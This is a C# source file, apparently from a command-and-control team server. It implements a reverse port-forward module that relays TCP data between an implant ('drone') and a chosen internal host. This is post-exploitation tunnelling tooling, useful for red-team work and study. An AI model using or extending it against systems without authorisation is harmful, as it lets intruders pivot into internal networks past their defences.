using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;

using TeamServer.Models;

namespace TeamServer.Modules
{
    public class ReversePortForwardModule : Module
    {
        public override string Name { get; } = "rportfwd";
        public override string Description { get; } = "Handle reverse port forwards";
        
        public override async Task Execute(DroneMetadata metadata, DroneTaskUpdate update)
        {
            var packet = update.Result.Deserialize<ReversePortForwardPacket>();
            if (packet is null) return;

            var forwardHost = packet.ForwardHost;

            if (!IPAddress.TryParse(forwardHost, out var address))
            {
                // if it doesn't parse, assume a hostname
                var addresses = await Dns.GetHostAddressesAsync(forwardHost);
                address = addresses.FirstOrDefault();
            }
            
            if (address is null) return;

            var client = new TcpClient();
            await client.ConnectAsync(address, packet.ForwardPort);

            var stream = client.GetStream();
            var outData = Convert.FromBase64String(packet.Data);
            stream.Write(outData, 0, outData.Length);

            var inData = await ReadFromStream(stream);

            var drone = Drones.GetDrone(metadata.Guid);
            drone?.TaskDrone(new DroneTask("rportfwd", "rportfwd-inbound")
            {
                Arguments = new [] { packet.BindPort.ToString(), Convert.ToBase64String(inData) }
            });
        }

        private static async Task<byte[]> ReadFromStream(Stream stream)
        {
            await using var ms = new MemoryStream();
            
            int read;
            do
            {
                var buf = new byte[1024];
                read = await stream.ReadAsync(buf, 0, buf.Length);
                await ms.WriteAsync(buf, 0, read);
            }
            while (read >= 1024);

            return ms.ToArray();
        }
    }
    
    [Serializable]
    public class ReversePortForwardPacket
    {
        public int BindPort { get; set; }
        public string ForwardHost { get; set; }
        public int ForwardPort { get; set; }
        public string Data { get; set; }
    }
}